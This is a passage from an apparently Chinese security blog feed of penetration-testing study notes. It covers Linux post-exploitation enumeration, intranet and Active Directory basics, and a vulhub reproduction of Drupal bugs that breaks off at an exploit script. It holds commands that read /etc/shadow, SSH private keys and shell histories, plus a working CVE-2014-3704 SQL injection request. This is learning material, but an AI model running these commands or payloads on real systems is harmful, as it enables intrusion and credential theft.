id="目标操作系统内核、多少位"><a href="#目标操作系统内核、多少位" class="headerlink" title="目标操作系统内核、多少位"></a>目标操作系统内核、多少位</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/version</span><br><span class="line">uname -a</span><br><span class="line">uname -mrs</span><br><span class="line">rpm -q kernel</span><br><span class="line">ls /boot | grep linuz</span><br></pre></td></tr></table></figure><h5 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/etc/profile</span><br><span class="line">/etc/bashrc</span><br><span class="line">~/.bash_profile</span><br><span class="line">~/.bash_history</span><br><span class="line">~/.bashrc</span><br><span class="line">~/.bash_bgout</span><br><span class="line">env</span><br><span class="line"><span class="built_in">set</span></span><br></pre></td></tr></table></figure><h5 id="运行的服务和进程"><a href="#运行的服务和进程" class="headerlink" title="运行的服务和进程"></a>运行的服务和进程</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ps -ef</span><br><span class="line">ps -aux</span><br><span class="line">top</span><br><span class="line">cat /etc/services</span><br><span class="line"><span class="comment">#查看root进程</span></span><br><span class="line">ps aux | grep root</span><br><span class="line">ps -ef | grep root</span><br></pre></td></tr></table></figure><h5 id="安装的程序"><a href="#安装的程序" class="headerlink" title="安装的程序"></a>安装的程序</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ls -alh /usr/bin</span><br><span class="line">ls -alh /sbin</span><br><span class="line">dpkg -l</span><br><span class="line">rpm -qa</span><br><span class="line">ls -alh /var/cache/apt/archivesO</span><br><span class="line">ls -alh /var/cache/yum/</span><br></pre></td></tr></table></figure><h5 id="定时任务"><a href="#定时任务" class="headerlink" title="定时任务"></a>定时任务</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">crontab -l</span><br><span class="line">ls -alh /var/spool/cron</span><br><span class="line">ls -al /etc/ | grep cron</span><br><span class="line">ls -al /etc/cron*</span><br><span class="line">cat /etc/cron*</span><br><span class="line">cat /etc/at.allow</span><br><span class="line">cat /etc/at.deny</span><br><span class="line">cat /etc/cron.allow</span><br><span class="line">cat /etc/cron.deny</span><br><span class="line">cat /etc/crontab</span><br><span class="line">cat /etc/anacrontab</span><br><span class="line">cat /var/spool/cron/crontabs/root</span><br></pre></td></tr></table></figure><h5 id="从文件中获取用户、密码信息"><a href="#从文件中获取用户、密码信息" class="headerlink" title="从文件中获取用户、密码信息"></a>从文件中获取用户、密码信息</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">grep -i user [filename]</span><br><span class="line">grep -i pass [filename]</span><br><span class="line">grep -C 5 <span class="string">"password"</span> [filename]</span><br><span class="line">find . -name <span class="string">"*.php"</span> -print0 | xargs -0 grep -i -n <span class="string">"var <span class="variable">$password</span>"</span> <span class="comment"># Joomla</span></span><br></pre></td></tr></table></figure><h4 id="网络相关信息"><a href="#网络相关信息" class="headerlink" title="网络相关信息"></a>网络相关信息</h4><h5 id="网络配置和端口监听"><a href="#网络配置和端口监听" class="headerlink" title="网络配置和端口监听"></a>网络配置和端口监听</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">bin /ifconfig -a</span><br><span class="line">cat /etc/network/infaces</span><br><span class="line">cat /etc/resolv.conf</span><br><span class="line">cat /etc/sysconfig/network</span><br><span class="line">cat /etc/networks</span><br><span class="line">iptables -L</span><br><span class="line">hostname</span><br><span class="line">dnsdomainname</span><br></pre></td></tr></table></figure><h5 id="与哪些主机在通讯？"><a href="#与哪些主机在通讯？" class="headerlink" title="与哪些主机在通讯？"></a>与哪些主机在通讯？</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">lsof -i</span><br><span class="line">lsof -i :80</span><br><span class="line">grep 80 /etc/services</span><br><span class="line">netstat -pantu</span><br><span class="line">netstat -antpx</span><br><span class="line">netstat -tulpn</span><br><span class="line">chkconfig --list</span><br><span class="line">chkconfig --list | grep 3:on</span><br><span class="line">last</span><br><span class="line">w</span><br></pre></td></tr></table></figure><h4 id="用户及敏感信息收集"><a href="#用户及敏感信息收集" class="headerlink" title="用户及敏感信息收集"></a>用户及敏感信息收集</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">id</span><br><span class="line">who</span><br><span class="line">w</span><br><span class="line">last</span><br><span class="line">cat /etc/passwd | cut -d: -f1 <span class="comment"># 列出用户</span></span><br><span class="line">grep -v -E <span class="string">"^#"</span> /etc/passwd | awk -F: <span class="string">'1&#125;'</span> <span class="comment"># 列出超级用户</span></span><br><span class="line">awk -F: <span class="string">'($3 == "0") &#123;print&#125;'</span> /etc/passwd <span class="comment"># 列出超级用户</span></span><br><span class="line">cat /etc/sudoers</span><br><span class="line">sudo -l</span><br><span class="line">cat /etc/passwd</span><br><span class="line">cat /etc/group</span><br><span class="line">cat /etc/shadow</span><br><span class="line">ls -alh /var/mail/</span><br></pre></td></tr></table></figure><h4 id="可能存在密码的文件？"><a href="#可能存在密码的文件？" class="headerlink" title="可能存在密码的文件？"></a>可能存在密码的文件？</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat /var/apache2/config.inc</span><br><span class="line">cat /var/lib/mysql/mysql/user.MYD</span><br><span class="line">cat /root/anaconda-ks.cfg</span><br></pre></td></tr></table></figure><h5 id="历史记录"><a href="#历史记录" class="headerlink" title="历史记录"></a>历史记录</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cat ~/.bash_history</span><br><span class="line">cat ~/.nano_history</span><br><span class="line">cat ~/.atftp_history</span><br><span class="line">cat ~/.mysql_history</span><br><span class="line">cat ~/.php_history</span><br></pre></td></tr></table></figure><h5 id="私钥"><a href="#私钥" class="headerlink" title="私钥"></a>私钥</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">cat ~/.ssh/authorized_keys</span><br><span class="line">cat ~/.ssh/identity.pub</span><br><span class="line">cat ~/.ssh/identity</span><br><span class="line">cat ~/.ssh/id_rsa.pub</span><br><span class="line">cat ~/.ssh/id_rsa</span><br><span class="line">cat ~/.ssh/id_dsa.pub</span><br><span class="line">cat ~/.ssh/id_dsa</span><br><span class="line">cat /etc/ssh/ssh_config</span><br><span class="line">cat /etc/ssh/sshd_config</span><br><span class="line">cat /etc/ssh/ssh_host_dsa_key.pub</span><br><span class="line">cat /etc/ssh/ssh_host_dsa_key</span><br><span class="line">cat /etc/ssh/ssh_host_rsa_key.pub</span><br><span class="line">cat /etc/ssh/ssh_host_rsa_key</span><br><span class="line">cat /etc/ssh/ssh_host_key.pub</span><br><span class="line">cat /etc/ssh/ssh_host_key</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 内网安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网安全 </tag>
            
            <tag> 内网信息收集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网安全学习笔记-Ⅰ：内网基础知识</title>
      <link href="2020/12/01/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E2%85%A0%EF%BC%9A%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
      <url>2020/12/01/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E2%85%A0%EF%BC%9A%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
      
        <content type="html"><![CDATA[<h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><table><thead><tr><th>主要部分</th><th>知识点</th></tr></thead><tbody><tr><td>内网基础知识</td><td>内网概述<br/>工作组<br/>域<br/>活动目录（AD）<br/>DC和AD区别<br/>安全域划分<br/>域中计算机分类<br/>域内权限解读</td></tr><tr><td>攻击主机平台及常用工具</td><td>虚拟机的安装<br/>Kali Linux渗透测试平台及常用工具<br/>Windows渗透测试平台及常用工具</td></tr></tbody></table><h2 id="内网基础知识"><a href="#内网基础知识" class="headerlink" title="内网基础知识"></a>内网基础知识</h2><h3 id="1、内网"><a href="#1、内网" class="headerlink" title="1、内网"></a>1、内网</h3><blockquote><p>  <strong>内网也指局域网（Local Area Network，LAN）</strong>是指在某一区域内由多台计 算机互联成的计算机组，一般是方圆几千米以内。局域网可以实现文件管理、应用软件共享、打印机共享、工作组内的历程安排、电子邮件和传真通信服务等功能。内网是封闭型的，它可以由办公室内的两台计算机组成，也可以由一个 公司内的上千台计算机组成。列如银行、学校、企业工厂、政府机关、 网吧、单位办公网等都属于此类。</p></blockquote><h3 id="2、工作组"><a href="#2、工作组" class="headerlink" title="2、工作组"></a>2、工作组</h3><blockquote><p><strong>工作组（Work Group）</strong>，在一个大的单位内，可能有成百上千台电脑 互相连接组成局域网，它们都会列在“网络（网上邻居）”内，如果这些电脑不分组，可想而知有多么混乱，要找一台电脑很困难。为了解 决这一问题，就有了“工作组”这个概念，<strong>将不同的电脑一般按功能 （或部门）分别列入不同的工作组中</strong>，如技术部的电脑都列入“技术 部”工作组中，行政部的电脑都列入“行政部”工作组中。你要访问某个 部门的资源，就在“网络”里找到那个部门的工作组名，双击就可以看 到那个部门的所有电脑了。相比不分组的情况就有序的多了，尤其是 对于大型局域网络来说</p></blockquote><h3 id="3、域"><a href="#3、域" class="headerlink" title="3、域"></a>3、域</h3><blockquote><p><strong>域(Domain)是一个有安全边界的计算机集合</strong>（安全边界意思是在两个域中，一个域中的用户无法访问另一个域中的资源），可以简单的把域理解成升级版的“工作组”，相比工作组而言，它有一个更加严格的安 全管理控制机制，如果你想访问域内的资源，必须拥有一个合法的身份登陆到该域中,而你对该域内的资源拥有什么样的权限，还需要取决于你在该域中的用户身份。</p></blockquote><h4 id="单域"><a href="#单域" class="headerlink" title="单域"></a>单域</h4><blockquote><p>在一般的具有固定地理位置的小公司里，建立一个域就可以满足所需。 </p><p>一般在一个域内要建立至少两个域服务器，一个作为DC，一个是备份DC。如果没有第二个备份DC，那么一旦DC瘫痪了，则域内的其他用 户就不能登陆该域了，因为活动目录的数据库（包括用户的帐号信息） 是存储在DC中的。而有一台备份域控制器（BDC），则至少该域还能 正常使用，期间把瘫痪的DC恢复了就行了。</p></blockquote><h4 id="父域、子域、域树、域林"><a href="#父域、子域、域树、域林" class="headerlink" title="父域、子域、域树、域林"></a>父域、子域、域树、域林</h4><p><img src="/imgs/image-20201029164925306.png" alt="image-20201029164925306"></p><p>如上图，baidu.com下面再分一级就是子域，baidu.com、baike.baidu.com和image.baidu.com组成一个域树，统里test.com和t.test.com组成一个域树，这两个域树组成域森林。</p><blockquote><p>出于管理及其他一些需求，需要在网络中划分多个域，第一个域称为父域，各分部的域称为该域的子域。</p><p>比如一个大公司，它的不同分公司在不同的地理位置，则需父域及子 域这样的结构。 </p><p>如果把不同地理位置的分公司放在同一个域内，那么他们之间信息交 互（包括同步，复制等）所花费的时间会比较长，而且占用的带宽也 比较大。（因为在同一个域内，信息交互的条目是很多的，而且不压 缩；而在域和域之间，信息交互的条目相对较少，而且压缩。） </p><p>出于安全策略的考虑，因为每个域都有自己独有 的安全策略。比如一个公司的财务部门希望能使用特定的安全策略 （包括帐号密码策略等），那么可以将财务部门做成一个子域来单独 管理</p><p>域树指若干个域通过建立信任关系组成的集合。一个域管理员只能管理本域的内部，不能访问或者管理其他的域，二个域之间相互访问则 需要建立信任关系(Trust Relation)。 信任关系是连接在域与域之间的桥梁。域树内的父域与子域之间不但 可以按需要相互进行管理，还可以跨网分配文件和打印机等设备资源， 使不同的域之间实现网络资源的共享与管理，以及相互通信和数据传输。</p></blockquote><h3 id="DNS服务器"><a href="#DNS服务器" class="headerlink" title="DNS服务器"></a>DNS服务器</h3><p>DNS实现域名对IP的转换。域树中的域名和DNS域名一致，域中的计算机实际也是通过DNS来定位域控制器（DC）、服务器和其它计算机，因此域的名字即DNS域的名字。内网中，一般<strong>域控制器都是DNS服务器</strong>。</p><h3 id="活动目录AD"><a href="#活动目录AD" class="headerlink" title="活动目录AD"></a>活动目录AD</h3><blockquote><p>活动目录（Active Directory，AD）是域环境中提供目录服务的组件。目录就是存储有关网络对象（如用户、组、计算机、共享资源、打印机和联系人等）的信息。目录服务是帮助用户快速准确 的从目录中查找到他所需要的信息的服务。</p><p>如果将企业的内网看成是一本字典，那么内网里的资源就是字典的内 容，活动目录就相当于字典的索引。即活动目录存储的是网络中所有 资源的快捷方式，用户通过寻找快捷方式而定位资源。</p></blockquote><h4 id="活动目录的主要功能"><a href="#活动目录的主要功能" class="headerlink" title="活动目录的主要功能"></a>活动目录的主要功能</h4><blockquote><p>• 帐号集中管理，所有帐号均存在服务器上,方便对帐号的重命令/重置 密码。</p><p> • 软件集中管理，统一推送软件，统一安装网络打印机等。利用软件发 布策略分发软件,可以让用户自由选择安装软件。 </p><p>• 环境集中管理，利用AD可以统一客户端桌面,IE,TCP/IP等设置。 </p><p>• 增强安全性，统一部署杀毒软件和扫毒任务，集中化管理用户的计算 机权限、统一制订用户密码策略等，可监控网络，资料统一管理。 • 更可靠，更少的宕机时间。如：利用AD控制用户访问权限，利用群集、 负载均衡等技术对文件服务器进行容灾设定，更可靠，宕机时间更少。 </p><p>• 活动目录为Microsoft统一管理的基础平台，其它isa,exchange,sms等服 务都依赖于这个基础平台。</p></blockquote><h4 id="逻辑结构"><a href="#逻辑结构" class="headerlink" title="逻辑结构"></a>逻辑结构</h4><blockquote><p>在活动目录中，管理员可以完全忽略被管理对象的具体地理位置，而将这些对象按照 一定的方式放置在不同的容器中。由于这种组织对象的做法不考虑被管理对象的具体 地理位置，这种组织框架称为“逻辑结构”。 <strong>活动目录的逻辑结构就包括上面讲到的组织单元（OU）、域（domain）、域树 （tree）、域森林（forest）</strong>。在域树内的所有域共享一个活动目录，这个活动目录内 的数据分散地存储在各个域内，且每一个域只存储该域内的数据。</p></blockquote><h3 id="DC和AD区别"><a href="#DC和AD区别" class="headerlink" title="DC和AD区别"></a>DC和AD区别</h3><blockquote><p>我们把存放有活动目录数据库的计算机就称为DC，也就是说装了AD的那台服务器就是DC。</p></blockquote><h3 id="安全域划分"><a href="#安全域划分" class="headerlink" title="安全域划分"></a>安全域划分</h3><p>一般网络拓扑差不多也是下面这种情况：外网-&gt;DMZ&lt;-内网。</p><p><img src="/imgs/image-20201202201805647.png" alt="image-20201202201805647"></p><h4 id="DMZ"><a href="#DMZ" class="headerlink" title="DMZ"></a>DMZ</h4><blockquote><p> DMZ称为“隔离区”，也称“非军事化区”。是为了解决安装防火墙后外 部网络不能访问内部网络服务器的问题，而设立的一个非安全系统与 安全系统之间的缓冲区。 </p><p>这个缓冲区位于企业内部网络和外部网络之间的小网络区域内，<strong>在这个小网络区域内一般会放置一些必须公开的服务器设施，如企业Web服 务器、FTP服务器和论坛等。</strong></p><p>另一方面，通过这样一个DMZ区域，更加有效地保护了内部网络，因 为这种网络部署，比起一般的防火墙方案，对攻击者来说又多了一道 关卡。</p></blockquote><h4 id="DMZ的屏障功能"><a href="#DMZ的屏障功能" class="headerlink" title="DMZ的屏障功能"></a>DMZ的屏障功能</h4><blockquote><p>（1）内网可以访问外网 内网的用户需要自由地访问外网。在这一策略中，防火墙需要执行NAT。 </p><p>（2）内网可以访问DMZ 此策略使内网用户可以使用或者管理DMZ中的服务器。</p><p>（3）外网不能访问内网 这是防火墙的基本策略了，内网中存放的是公司内部数据，显然这些数据是不允许外网的用户进行访问的。如 果要访问，就要通过VPN方式来进行。</p><p>（4）外网可以访问DMZ DMZ中的服务器需要为外界提供服务，所以外网必须可以访问DMZ。同时，外网访问DMZ需要由防火墙完成对 外地址到服务器实际地址的转换。</p><p>（5）DMZ不能访问内网 如不执行此策略，则当入侵者攻陷DMZ时，内部网络将不会受保护。</p><p>（6）DMZ不能访问外网 此条策略也有例外，比如我们的例子中，在DMZ中放置邮件服务器时，就需要访问外网，否则将不能正常工作。</p></blockquote><h3 id="域中计算机分类"><a href="#域中计算机分类" class="headerlink" title="域中计算机分类"></a>域中计算机分类</h3><blockquote><p>域中计算机分类：域控制器 、成员服务器 、客户机 、 独立服务器</p><p>域控制器是存放活动目录数据库的，是域中必须要有的，而其他三种 则不是必须的，也就是说最简单的域可以只包含一台计算机，这台计 算机就是该域的域控制器。 域中各个服务器的角色也是可以改变的，例如域服务器在删除活动目 录时，如果是域中最后一个域控制器，则该域服务器会成为独立服务 器，如果不是域中唯一的域控制器，则将使该服务器成为成员服务器。 同时独立服务器既可以转换为域控制器，也可以加入到某个域成为成 员服务器。</p></blockquote><h3 id="域内权限解读"><a href="#域内权限解读" class="headerlink" title="域内权限解读"></a>域内权限解读</h3><blockquote><p>域内权限：组 、本地组、 域本地组 、全局组 、通用组</p></blockquote><h4 id="A-G-DL-P"><a href="#A-G-DL-P" class="headerlink" title="A-G-DL-P"></a>A-G-DL-P</h4><blockquote><p>策略</p><p> • A(account)，表示用户账号</p><p> • G(Global group)，表示全局组</p><p> • U(Universal group)，表示通用组 </p><p> • DL(Domain local group)，表示域本地组</p><p> • P(Permission 许可)，表示资源权限。</p><p> • A-G-DL-P策略是将用户账号添加到全局组中，将全局组添加到域本地 组中，然后为域本地组分配资源权限。按照AGDLP的原则对用户进行 组织和管理起来更容易。</p><p> • 在AGDLP形成以后当给一个用户某一个权限的时候,只要把这个用户加 入到某一个本地域组就可以了。</p></blockquote><h4 id="本地域组的权限"><a href="#本地域组的权限" class="headerlink" title="本地域组的权限"></a>本地域组的权限</h4><blockquote><p> • Administrators（管理员组）</p><p> • Remote Desktop Users(远程登录组) </p><p> • Print Operators（打印机操作员组）</p><p> • Account Operators（帐号操作员组）  </p><p> • Server Operaters（服务器操作员组）</p><p> • Backup Operators（备份操作员组）</p></blockquote><h4 id="全局组、通用组的权限"><a href="#全局组、通用组的权限" class="headerlink" title="全局组、通用组的权限"></a>全局组、通用组的权限</h4><blockquote><p>• Domain Admins（域管理员组）</p><p> • Enterprise Admins（企业系统管理员组）</p><p> • Schema Admins（架构管理员组）</p><p> • Domain Users（域用户组）</p></blockquote><h3 id="域环境搭建"><a href="#域环境搭建" class="headerlink" title="域环境搭建"></a>域环境搭建</h3><p>域环境搭建可以参考：<a href="https://blog.csdn.net/wwl012345/article/details/88934571" target="_blank" rel="noopener">https://blog.csdn.net/wwl012345/article/details/88934571</a></p><h2 id="攻击主机平台及常用工具"><a href="#攻击主机平台及常用工具" class="headerlink" title="攻击主机平台及常用工具"></a>攻击主机平台及常用工具</h2><p>Kali Linux 常用工具:</p><p>• WCE</p><p>• Minikatz</p><p>• DSHashes </p><p>• PowerSploit</p><p>• Nishang</p><p>• ps_encoder.py</p><p>• SMBEexe</p><p>• 后门制造工厂</p><p>• Veil</p><h3 id="Windows渗透测试平台及常用工具"><a href="#Windows渗透测试平台及常用工具" class="headerlink" title="Windows渗透测试平台及常用工具"></a>Windows渗透测试平台及常用工具</h3><p>• Nmap</p><p>• Wireshark</p><p>• PuTTY</p><p>• SQLmap</p><p>• Burp Suite</p><p>• Hydra</p><p>• Getif</p><p>• Evade</p><p>• Cain＆Abel</p><p>• Metasploit Framework</p><p>• PowerSploit</p><p>• Nishang</p>]]></content>
      
      
      <categories>
          
          <category> 内网安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网安全 </tag>
            
            <tag> 内网渗透基础知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网学习笔记</title>
      <link href="2020/12/01/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>2020/12/01/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>最近在学习徐焱大佬的内网安全和一些收集到的红队文件，系统的学习还是能提升自己的，学习过程中的笔记记录并分享到这里。</p><p>部分内容的视频学习在公众号进行了公开：<a href="https://mp.weixin.qq.com/mp/appmsgalbum?__biz=MzU1NjgzOTAyMg==&action=getalbum&album_id=1527050035329351681&scene=173&from_msgid=2247488496&from_itemidx=1&count=3#wechat_redirect" target="_blank" rel="noopener">内网安全攻防：配套视频</a></p><p>不限于7个部分，我也会从每个部分进行笔记，笔记中会记录我实践的截图</p><ol><li>内网渗透基础</li><li>内网信息收集</li><li>隐藏通信隧道技术</li><li>Windows提权</li><li>Linux提权</li><li>利用metasploit实战演练</li><li>内网横向移动</li></ol><p>其它内网渗透优质文章：</p><p><a href="https://mp.weixin.qq.com/s/U0gaKpT5mARlkAbF69dIvg" target="_blank" rel="noopener">内网渗透技术汇总</a></p><p><a href="https://mp.weixin.qq.com/s/DNJPQdHzBSYx0s3YcPFOiQ" target="_blank" rel="noopener">内网渗透 | 内网中的信息收集</a></p><p><a href="https://mp.weixin.qq.com/s/o19f28x50dDICcActdvqXw" target="_blank" rel="noopener">如何进行内网信息收集</a></p><p><a href="https://mp.weixin.qq.com/s/wqhHMCHNrlLg-EhD_1mt2Q" target="_blank" rel="noopener">干货|meterpreter命令总结</a></p><p><a href="https://mp.weixin.qq.com/s/04TvD-hBDG5MhSDK3TWvtg" target="_blank" rel="noopener">内网渗透 | 常用的内网穿透工具使用</a></p><p><a href="https://mp.weixin.qq.com/s/XfURtykYIcdxHuAmBybZLw" target="_blank" rel="noopener">如何利用CobalStrike进行批量上线？</a></p><p><a href="https://mp.weixin.qq.com/s/clynAmwsEn_aWvFl_G-HIQ" target="_blank" rel="noopener">CobalStrike批量上线后的权限维持和信息收集</a></p>]]></content>
      
      
      <categories>
          
          <category> 内网安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Drupal 2019年前的系列漏洞复现</title>
      <link href="2020/11/24/Drupal-2019%E5%B9%B4%E5%89%8D%E7%9A%84%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>2020/11/24/Drupal-2019%E5%B9%B4%E5%89%8D%E7%9A%84%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<blockquote><p>Drupal是使用PHP语言编写的开源内容管理框架（CMF），它由<a href="https://baike.baidu.com/item/内容管理系统/2683135" target="_blank" rel="noopener">内容管理系统</a>（CMS）和PHP开发框架（Framework）共同构成。连续多年荣获全球最佳CMS大奖，是基于PHP语言最著名的WEB应用程序。截止2011年底，共有13,802位WEB专家参加了Drupal的开发工作；228个国家使用181种语言的729,791位网站设计工作者使用Drupal。著名案例包括：联合国、美国白宫、<a href="https://baike.baidu.com/item/美国商务部/3953268" target="_blank" rel="noopener">美国商务部</a>、<a href="https://baike.baidu.com/item/纽约时报/1049617" target="_blank" rel="noopener">纽约时报</a>、<a href="https://baike.baidu.com/item/华纳/777067" target="_blank" rel="noopener">华纳</a>、<a href="https://baike.baidu.com/item/迪斯尼/336959" target="_blank" rel="noopener">迪斯尼</a>、<a href="https://baike.baidu.com/item/联邦快递/4759000" target="_blank" rel="noopener">联邦快递</a>、索尼、美国哈佛大学、Ubuntu等。</p></blockquote><p>以下漏洞的复现环境都是vulhub</p><h3 id="CVE-2014-3704-SQL注入漏洞"><a href="#CVE-2014-3704-SQL注入漏洞" class="headerlink" title="CVE-2014-3704 SQL注入漏洞"></a>CVE-2014-3704 SQL注入漏洞</h3><blockquote><p>Drupal 是一款用量庞大的CMS，其7.0~7.31版本中存在一处无需认证的SQL漏洞。通过该漏洞，攻击者可以执行任意SQL语句，插入、修改管理员信息，甚至执行任意代码。</p></blockquote><h4 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/?q=node&amp;destination=node</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: ip:port</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">pass=lol&amp;form_build_id=&amp;form_id=user_login_block&amp;op=Log+in&amp;name[0 or updatexml(0,concat(0xa,user()),0)%23]=bob&amp;name[0]=a</span><br></pre></td></tr></table></figure><p><img src="/imgs/image-20201124192434140.png" alt="image-20201124192434140"></p><h4 id="EXP-重置管理员用户为指定用户信息"><a href="#EXP-重置管理员用户为指定用户信息" class="headerlink" title="EXP -重置管理员用户为指定用户信息"></a>EXP -重置管理员用户为指定用户信息</h4><p>依赖脚本drupalpass：<a href="https://github.com/cvangysel/gitexd-drupalorg/blob/master/drupalorg/drupalpass.py" target="_blank" rel="noopener">https://github.com/cvangysel/gitexd-drupalorg/blob/master/drupalorg/drupalpass.py</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span 